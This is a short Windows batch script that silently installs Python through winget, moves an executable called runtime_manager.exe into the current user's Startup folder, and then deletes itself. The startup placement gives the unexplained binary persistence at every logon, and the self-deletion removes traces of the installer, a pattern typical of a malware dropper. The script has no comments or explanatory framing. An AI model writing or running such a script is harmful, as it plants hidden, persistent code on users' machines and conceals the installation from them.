@echo off
winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
MOVE "%~dp0runtime_manager.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
(goto) 2>nul & del "%~f0"